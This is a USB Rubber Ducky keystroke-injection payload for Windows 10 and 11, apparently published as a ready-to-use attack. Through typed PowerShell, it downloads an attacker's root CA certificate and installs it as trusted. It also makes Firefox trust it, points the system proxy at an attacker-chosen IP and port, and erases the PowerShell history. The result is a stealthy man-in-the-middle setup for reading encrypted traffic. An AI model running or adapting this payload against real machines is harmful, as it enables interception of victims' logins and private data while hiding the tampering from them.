REM Title: Windows Duck In The Middle
REM Author: Who-Is-Julien
REM Description: The payload configures the target PC user to redirect network traffic via a proxy, enabling a Man-in-the-middle attack.
REM Target: Windows 10, 11
REM Documentation: https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/Payloads/Windows-Duck-In-The-Middle/README.md

REM Basic options:
REM The download link for your Trusted Root CA certificate
DEFINE CERT_URL example.com
REM Your proxy's IP address
DEFINE PROXY_IP 127.0.0.1
REM Your proxy port
DEFINE PROXY_PORT 8080

REM Advanced options:
REM Short delay time
DEFINE SHORT_DELAY 500
REM Medium delay time
DEFINE MEDIUM_DELAY 2000
REM Long delay time
DEFINE LONG_DELAY 4000

EXTENSION PASSIVE_DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Passive Detect Ready - no injection dynamic boot delay
        for hosts that reflect current OS lock key state on connect

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
END_EXTENSION

CTRL GUI d
DELAY SHORT_DELAY
GUI x
DELAY SHORT_DELAY
STRING i
DELAY MEDIUM_DELAY
STRING Clear-Host; $c = New-TemporaryFile; try { Invoke-WebRequest -Uri "
STRING CERT_URL
STRING " -OutFile $c; Import-Certificate -FilePath $c -CertStoreLocation "Cert:\CurrentUser\Root"; if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } }; @{"ProxyServer" = "
STRING PROXY_IP
STRING :
STRING PROXY_PORT
STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value }} finally { Remove-Item $c; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit }
DELAY SHORT_DELAY
ENTER
DELAY LONG_DELAY
ALT TAB
DELAY SHORT_DELAY
TAB
DELAY SHORT_DELAY
ENTER
DELAY SHORT_DELAY
CTRL GUI F4
DELAY SHORT_DELAY
ATTACKMODE OFF
